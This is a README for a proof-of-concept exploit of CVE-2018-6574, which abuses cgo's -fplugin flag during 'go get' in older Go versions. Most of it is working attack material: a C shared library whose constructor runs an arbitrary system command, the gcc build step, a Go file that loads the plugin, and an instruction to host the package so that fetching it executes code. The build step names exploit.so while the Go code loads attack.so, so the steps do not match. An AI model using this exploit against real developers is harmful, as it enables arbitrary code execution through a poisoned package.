# CVE-2018-6574 POC

Exploit POC For CVE-2018-6574

## Compile

1. Create an exploit file with the following:
```c
#include<stdio.h>
#include<stdlib.h>

static void malicious() __attribute__((constructor));

void malicious() {
    system("COMMAND");
}
```
2. Compile it:
```bash
gcc -shared -o exploit.so -fPIC exploit.c
```
3. Finally, you need the go code that will tell cgo to use your plugin:
```go
package main
// #cgo CFLAGS: -fplugin=./attack.so
// typedef int (*intFunc) ();
//
// int
// bridge_int_func(intFunc f)
// {
//      return f();
// }
//
// int fortytwo()
// {
//      return 42;
// }
import "C"
import "fmt"

func main() {
    f := C.intFunc(C.fortytwo)
    fmt.Println(int(C.bridge_int_func(f)))
    // Output: 42
}
```
4. then host in a github and run it to gain command Execution:
```bash
go get github.com/your-repo/CVE-2018-6574-POC
```

## VERSION

- before 1.8.7
- before 1.9.4
- before Go 1.10rc2

## Refrences

- https://nvd.nist.gov/vuln/detail/CVE-2018-6574
- http://blog.nsfocus.net/cve-2018-6574/